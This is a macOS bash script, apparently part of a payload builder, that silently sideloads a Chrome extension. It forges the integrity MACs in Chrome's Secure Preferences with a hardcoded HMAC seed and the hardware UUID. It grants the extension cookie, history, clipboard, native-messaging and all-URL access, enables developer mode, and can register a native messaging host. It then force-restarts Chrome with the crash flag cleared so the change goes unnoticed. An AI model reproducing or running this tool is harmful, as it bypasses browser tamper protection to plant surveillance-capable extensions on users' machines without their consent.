#!/bin/bash

# Chrome Extension Sideloader for macOS
# This script sideloads Chrome extensions by modifying Chrome's Secure Preferences

# Default parameters
EXTENSION_INSTALL_DIR="$HOME/Library/Application Support/Google/Chrome/Default/Extensions/myextension"
EXTENSION_DESCRIPTION="Chrome Extension"
INSTALL_NATIVE_MESSAGING_HOST="false"
FORCE_RESTART_CHROME="true"

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --extension-dir)
            EXTENSION_INSTALL_DIR="$2"
            shift 2
            ;;
        --description)
            EXTENSION_DESCRIPTION="$2"
            shift 2
            ;;
        --install-native-host)
            INSTALL_NATIVE_MESSAGING_HOST="$2"
            shift 2
            ;;
        --force-restart)
            FORCE_RESTART_CHROME="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Chrome path helper functions
get_chrome_application_path() {
    local chrome_app_path="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    if [[ -f "$chrome_app_path" ]]; then
        echo "$chrome_app_path"
        return 0
    fi
    
    echo "Cannot find Google Chrome application." >&2
    return 1
}

get_chrome_resources_path() {
    local resources_path="/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Resources/resources.pak"
    if [[ -f "$resources_path" ]]; then
        echo "$resources_path"
        return 0
    fi
    
    echo "Cannot find Chrome resources.pak file." >&2
    return 1
}

get_preferences_path() {
    echo "$HOME/Library/Application Support/Google/Chrome/Default/Preferences"
}

get_secure_preferences_path() {
    echo "$HOME/Library/Application Support/Google/Chrome/Default/Secure Preferences"
}

# Chrome machine ID functions
get_device_id() {
    # Use system UUID as device ID base - get the Hardware UUID and format it properly
    system_profiler SPHardwareDataType | awk '/UUID/ { print $3; }' | cut -d'-' -f1-7 | tr '[:lower:]' '[:upper:]'
}

get_machine_key() {
    # Hardcoded machine key seed (same value used across all instances)
    # This is the hex representation of the Python bytes:
    # b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
    echo "e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8"
}

# Extension crypto helpers
calculate_sha256_hash() {
    local input="$1"
    echo -n "$input" | /usr/local/bin/shasum -a 256 | /usr/bin/cut -d' ' -f1
}

calculate_extension_id_from_path() {
    local path="$1"
    
    # Convert path to UTF-8 bytes (like Python version), then calculate SHA256
    local sha256_hash=$(echo -n "$path" | /usr/local/bin/shasum -a 256 | /usr/bin/cut -d' ' -f1)
    
    # Convert first 32 hex chars to extension ID (a-p mapping)
    local extension_id=""
    local i
    for ((i=0; i<32; i++)); do
        local hex_char="${sha256_hash:$i:1}"
        case "$hex_char" in
            0) extension_id+="a" ;;
            1) extension_id+="b" ;;
            2) extension_id+="c" ;;
            3) extension_id+="d" ;;
            4) extension_id+="e" ;;
            5) extension_id+="f" ;;
            6) extension_id+="g" ;;
            7) extension_id+="h" ;;
            8) extension_id+="i" ;;
            9) extension_id+="j" ;;
            a) extension_id+="k" ;;
            b) extension_id+="l" ;;
            c) extension_id+="m" ;;
            d) extension_id+="n" ;;
            e) extension_id+="o" ;;
            f) extension_id+="p" ;;
        esac
    done
    
    echo "$extension_id"
}

# JSON manipulation functions
edit_json() {
    local json_input="$1"
    local key_path="$2"
    local new_value="$3"
    
    # Use osascript to manipulate JSON with support for nested keys
    osascript -l JavaScript -e "
function run(argv) {
    var jsonInput = argv[0];
    var keyPath = argv[1];
    var newValue = argv[2];
    
    // Parse the input JSON
    var jsonObj;
    try {
        jsonObj = JSON.parse(jsonInput);
    } catch (e) {
        throw new Error('Invalid JSON input: ' + e.message);
    }
    
    // Split the key path by dots to handle nested keys
    var keys = keyPath.split('.');
    var current = jsonObj;
    
    // Navigate/create the nested structure
    for (var i = 0; i < keys.length - 1; i++) {
        var key = keys[i];
        if (!(key in current) || typeof current[key] !== 'object' || current[key] === null || Array.isArray(current[key])) {
            current[key] = {};
        }
        current = current[key];
    }
    
    // Set the final value
    var finalKey = keys[keys.length - 1];
    
    // Try to parse the new value as JSON first, if it fails treat as string
    try {
        current[finalKey] = JSON.parse(newValue);
    } catch (e) {
        // If parsing fails, treat as string
        current[finalKey] = newValue;
    }
    
    // Return the modified JSON
    return JSON.stringify(jsonObj);
}" "$json_input" "$key_path" "$new_value"
}

read_json_key() {
    local json_input="$1"
    local key_path="$2"
    
    # Use osascript to read a specific key from JSON and return it as JSON string
    osascript -l JavaScript -e "
function run(argv) {
    var jsonInput = argv[0];
    var keyPath = argv[1];
    
    // Parse the input JSON
    var jsonObj;
    try {
        jsonObj = JSON.parse(jsonInput);
    } catch (e) {
        throw new Error('Invalid JSON input: ' + e.message);
    }
    
    // Split the key path by dots to handle nested keys
    var keys = keyPath.split('.');
    var current = jsonObj;
    
    // Navigate to the target key
    for (var i = 0; i < keys.length; i++) {
        var key = keys[i];
        if (!(key in current)) {
            throw new Error('Key path not found: ' + keyPath);
        }
        current = current[key];
    }
    
    // Return the value as JSON string
    return JSON.stringify(current);
}" "$json_input" "$key_path"
}

sort_and_cull_json() {
    local json_str="$1"
    
    osascript -l JavaScript -e "
function run(argv) {
    var jsonStr = argv[0];
    var obj = JSON.parse(jsonStr);
    
    function removeEmpty(obj) {
        if (Array.isArray(obj)) {
            // For arrays, filter out empty elements
            return obj.filter(function(item) {
                if (item === null || item === undefined || item === '') return false;
                if (typeof item === 'object') {
                    var cleaned = removeEmpty(item);
                    return Object.keys(cleaned).length > 0 || Array.isArray(cleaned) && cleaned.length > 0;
                }
                return true;
            }).map(removeEmpty);
        } else if (obj !== null && typeof obj === 'object') {
            var result = {};
            for (var key in obj) {
                if (obj.hasOwnProperty(key)) {
                    var value = obj[key];
                    if (value === null || value === undefined || value === '') continue;
                    if (typeof value === 'object') {
                        var cleaned = removeEmpty(value);
                        if (Array.isArray(cleaned) && cleaned.length === 0) continue;
                        if (!Array.isArray(cleaned) && Object.keys(cleaned).length === 0) continue;
                        result[key] = cleaned;
                    } else {
                        result[key] = value;
                    }
                }
            }
            return result;
        }
        return obj;
    }
    
    var cleaned = removeEmpty(obj);
    var result = JSON.stringify(cleaned, null, 0);
    
    // Handle Unicode escaping like Chrome does
    result = result.replace(/</g, '\\\\\\\\u003C');
    result = result.replace(/>/g, '\\\\\\\\u003E');
    
    return result;
}" "$json_str"
}

sort_and_cull_json_for_hmac() {
    local json_str="$1"
    
    osascript -l JavaScript -e "
function run(argv) {
    var jsonStr = argv[0];
    var obj = JSON.parse(jsonStr);
    
    function removeEmpty(obj) {
        if (Array.isArray(obj)) {
            // For arrays, filter out empty elements
            return obj.filter(function(item) {
                if (item === null || item === undefined || item === '') return false;
                if (typeof item === 'object') {
                    var cleaned = removeEmpty(item);
                    return Object.keys(cleaned).length > 0 || Array.isArray(cleaned) && cleaned.length > 0;
                }
                return true;
            }).map(removeEmpty);
        } else if (obj !== null && typeof obj === 'object') {
            var result = {};
            for (var key in obj) {
                if (obj.hasOwnProperty(key)) {
                    var value = obj[key];
                    if (value === null || value === undefined || value === '') continue;
                    if (typeof value === 'object') {
                        var cleaned = removeEmpty(value);
                        if (Array.isArray(cleaned) && cleaned.length === 0) continue;
                        if (!Array.isArray(cleaned) && Object.keys(cleaned).length === 0) continue;
                        result[key] = cleaned;
                    } else {
                        result[key] = value;
                    }
                }
            }
            return result;
        }
        return obj;
    }
    
    var cleaned = removeEmpty(obj);
    var result = JSON.stringify(cleaned, null, 0);
    
    // For HMAC calculation, only escape < (not >) to match Python exactly
    result = result.replace(/</g, '\\\\\\\\u003C');


    return result;
}" "$json_str"
}

calculate_hmac_from_json() {
    local json_content="$1"
    local json_path="$2"
    local key_hex="$3"
    local device_id="$4"
    
    # Normalize the JSON by removing empty objects/arrays and sorting
    local fixed_content=$(sort_and_cull_json_for_hmac "$json_content")

    # Unescape double backslashes
    fixed_content=$(echo "$fixed_content" | sed 's/\\\\/\\/g')
    
    # Build message: deviceId + path + content (all UTF-8 encoded)
    local message="${device_id}${json_path}${fixed_content}"
    
    # Debug output - show exact message and hex for comparison with Python
    echo "DEBUG - Message: $message" >&2
    echo "DEBUG - Message length: ${#message}" >&2
    
    # Convert message to hex for debugging and HMAC calculation
    local message_hex=$(echo -n "$message" | /usr/bin/xxd -p | /usr/bin/tr -d '\n' | /usr/bin/tr '[:lower:]' '[:upper:]')
    echo "DEBUG - Message (hex): $message_hex" >&2
    
    # Calculate HMAC-SHA256 using openssl
    local hmac_result=$(echo -n "$message_hex" | /usr/bin/xxd -r -p | /usr/bin/openssl dgst -sha256 -mac HMAC -macopt hexkey:"$key_hex" | /usr/bin/cut -d' ' -f2)
    
    # Convert to uppercase
    echo "$hmac_result" | /usr/bin/tr '[:lower:]' '[:upper:]'
}

calculate_hmac_from_string() {
    local string_content="$1"
    local json_path="$2"
    local key_hex="$3"
    local device_id="$4"
    
    # Build message: deviceId + path + content (all UTF-8 encoded)
    local message_hex=""
    
    # Convert device_id to hex
    local device_id_hex=$(echo -n "$device_id" | /usr/bin/xxd -p | /usr/bin/tr -d '\n')
    message_hex+="$device_id_hex"
    
    # Convert json_path to hex
    local json_path_hex=$(echo -n "$json_path" | /usr/bin/xxd -p | /usr/bin/tr -d '\n')
    message_hex+="$json_path_hex"
    
    # Convert string_content to hex
    local content_hex=$(echo -n "$string_content" | /usr/bin/xxd -p | /usr/bin/tr -d '\n')
    message_hex+="$content_hex"
    
    # Convert key from hex to binary, then calculate HMAC-SHA256
    # We'll use openssl for HMAC calculation
    local hmac_result=$(echo -n "$message_hex" | /usr/bin/xxd -r -p | /usr/bin/openssl dgst -sha256 -mac HMAC -macopt hexkey:"$key_hex" | /usr/bin/cut -d' ' -f2)
    
    # Convert to uppercase
    echo "$hmac_result" | /usr/bin/tr '[:lower:]' '[:upper:]'
}

# Extension sideloader functions
add_extension_to_secure_preferences() {
    local secure_pref_file="$1"
    local extension_settings="$2"
    local install_path="$3"
    local device_id="$4"
    local key_hex="$5"
    
    echo "Adding extension for install path: $install_path" >&2
    
    # Calculate extension ID in bash
    local extension_id=$(calculate_extension_id_from_path "$install_path")
    echo "Calculated extension ID: $extension_id" >&2
    
    # Create extension settings with path for HMAC calculation (preserve field ordering)
    local extension_with_path="$extension_settings"
    # Replace placeholder path with actual path
    extension_with_path="${extension_with_path//PLACEHOLDER_PATH/$install_path}"    
    
    # Calculate HMACs in bash
    local extension_mac=$(calculate_hmac_from_json "$extension_with_path" "extensions.settings.$extension_id" "$key_hex" "$device_id")
    local developer_mode_mac=$(calculate_hmac_from_string "true" "extensions.ui.developer_mode" "$key_hex" "$device_id")
    
    echo "Extension with path: $extension_with_path" >&2
    echo "Extension HMAC: $extension_mac" >&2
    echo "Developer mode HMAC: $developer_mode_mac" >&2
    
    # Read current secure preferences or create empty structure
    local current_json="{}"
    if [[ -f "$secure_pref_file" ]]; then
        current_json=$(cat "$secure_pref_file" 2>/dev/null || echo "{}")
    fi
    
    # Add path to extension settings for the actual storage
    local extension_with_path=$(edit_json "$extension_settings" "path" "\"$install_path\"")
    
    # Use edit_json to build the secure preferences structure step by step
    # Add extension settings
    current_json=$(edit_json "$current_json" "extensions.settings.$extension_id" "$extension_with_path")
    
    # Enable developer mode
    current_json=$(edit_json "$current_json" "extensions.ui.developer_mode" "true")
    
    # Add extension MAC
    current_json=$(edit_json "$current_json" "protection.macs.extensions.settings.$extension_id" "\"$extension_mac\"")
    
    # Add developer mode MAC
    current_json=$(edit_json "$current_json" "protection.macs.extensions.ui.developer_mode" "\"$developer_mode_mac\"")
    
    # Write the updated JSON back to the file
    echo "$current_json" > "$secure_pref_file"
    
    echo "Extension added to secure preferences" >&2
    # returns the modified JSON
    echo "$current_json"
}

install_native_messaging_host() {
    local extension_path="$1"
    local native_app_path="$2"
    local extension_reg_name="$3"
    local extension_description="$4"
    
    local native_messaging_config_path="$extension_path/$extension_reg_name.json"
    local linked_extension_id=$(calculate_extension_id_from_path "$extension_path")
    
    # Create native messaging host configuration
    cat > "$native_messaging_config_path" << EOF
{
  "name": "$extension_reg_name",
  "description": "$extension_description",
  "path": "$native_app_path",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://$linked_extension_id/"]
}
EOF
    
    # Create registry entry (macOS uses different mechanism)
    local native_messaging_dir="$HOME/Library/Application Support/Google/Chrome/NativeMessagingHosts"
    mkdir -p "$native_messaging_dir"
    
    # Create symlink or copy config file
    ln -sf "$native_messaging_config_path" "$native_messaging_dir/$extension_reg_name.json"
    
    echo "Native messaging host installed"
}

# Extension settings JSON (matches Python field ordering exactly)
#EXTENSION_SETTINGS='{"account_extension_type":0,"active_permissions":{"api":["cookies","storage","tabs","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"first_install_time":"13401130184958405","from_webstore":false,"granted_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito":true,"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13401130184958405","location":4,"newAllowFileAccess":true,"path":"PLACEHOLDER_PATH","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'
EXTENSION_SETTINGS='{"account_extension_type":0,"active_permissions":{"api":["activeTab","background","clipboardRead","cookies","history","nativeMessaging","tabs","declarativeNetRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"commands":{},"content_settings":[],"creation_flags":38,"disable_reasons":[],"first_install_time":"13397690747955841","from_webstore":false,"granted_permissions":{"api":["activeTab","background","clipboardRead","cookies","history","nativeMessaging","tabs","declarativeNetRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13397690747955841","location":4,"newAllowFileAccess":true,"path":"PLACEHOLDER_PATH","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["runtime.onInstalled","runtime.onStartup"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'

main() {
    echo "Starting Chrome Extension Sideloader for macOS..."
    
    # Get Chrome paths and machine information
    local secure_pref_path=$(get_secure_preferences_path)
    local preferences_path=$(get_preferences_path)
    
    local device_id=$(get_device_id)
    local key_hex=$(get_machine_key)
    
    echo "Device ID: $device_id"
    echo "Secure Preferences Path: $secure_pref_path"
    echo "Machine Key: ${key_hex:0:16}..." # Show only first 16 chars for security
    
    # Check if Chrome is running and warn user
    if pgrep -f "Google Chrome" > /dev/null; then
        echo "⚠️  Chrome is currently running. For best results, please close Chrome before running this script."
        if [[ "$FORCE_RESTART_CHROME" != "true" ]]; then
            read -p "Continue anyway? (y/N): " -n 1 -r
            echo
            if [[ ! $REPLY =~ ^[Yy]$ ]]; then
                echo "Aborted by user."
                exit 1
            fi
        fi
    fi
    
    # Install extension
    local extension_install_path="$EXTENSION_INSTALL_DIR"
    echo "Installing extension to: $extension_install_path"
    
    # Extract embedded extension content
    extract_embedded_extension "$extension_install_path"
    
    # Modify secure preferences
    local modified_json=$(add_extension_to_secure_preferences "$secure_pref_path" "$EXTENSION_SETTINGS" "$extension_install_path" "$device_id" "$key_hex")
    
    # Extract the macs object from the modified JSON for super MAC calculation
    local macs_json=$(read_json_key "$modified_json" "protection.macs")
    
    # Calculate super MAC using the actual macs object (like PowerShell version)
    local super_mac=$(calculate_hmac_from_json "$macs_json" "" "$key_hex" "$device_id")
    
    echo "Calculated SuperMAC: $super_mac"
    
    # Set super MAC in the modified JSON
    modified_json=$(edit_json "$modified_json" "protection.super_mac" "\"$super_mac\"")
    
    # Write the final JSON back to the secure preferences file
    echo "$modified_json" > "$secure_pref_path"
    
    echo "Secure Preferences file updated successfully!"
    
    # Install native messaging host if specified
    if [[ "$INSTALL_NATIVE_MESSAGING_HOST" == "true" ]]; then
        local host_path="$extension_install_path/NativeAppHost"
        echo "Installing native messaging host to: $host_path"
        
        local extension_name=$(basename "$EXTENSION_INSTALL_DIR")
        local lower_case_extension_name=$(echo "$extension_name" | tr '[:upper:]' '[:lower:]')
        install_native_messaging_host "$extension_install_path" "$host_path" "$lower_case_extension_name" "$EXTENSION_DESCRIPTION"
    fi
    
    # Force restart Chrome if specified
    if [[ "$FORCE_RESTART_CHROME" == "true" ]]; then
        echo "Force restarting Chrome..."
        
        # Kill Chrome processes
        pkill -f "Google Chrome" || true
        sleep 2
        
        # Wait for processes to fully terminate
        while pgrep -f "Google Chrome" > /dev/null; do
            sleep 0.1
        done
        
        # Update preferences to remove crash flag
        if [[ -f "$preferences_path" ]]; then
            sed -i '' 's/"exit_type":"Crashed"/"exit_type":"none"/g' "$preferences_path"
            echo "Updated Chrome preferences to remove crash flag"
        fi
        
        # Restart Chrome
        local chrome_path=$(get_chrome_application_path)
        if [[ -f "$chrome_path" ]]; then
            open -a "Google Chrome" --args --restore-last-session
            echo "Chrome restarted with session restore"
        else
            echo "Chrome executable not found"
        fi
    fi
    
    
    echo "Chrome Extension Sideloader completed successfully!"
}

# These functions will be replaced by the Python builder with actual extraction logic
extract_embedded_extension() {
    local extension_path="$1"
    # This will be replaced by the Python builder
    echo "Extract-EmbeddedExtension function not implemented - this should be replaced by the Python builder"
    exit 1
}

# Run main function only if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
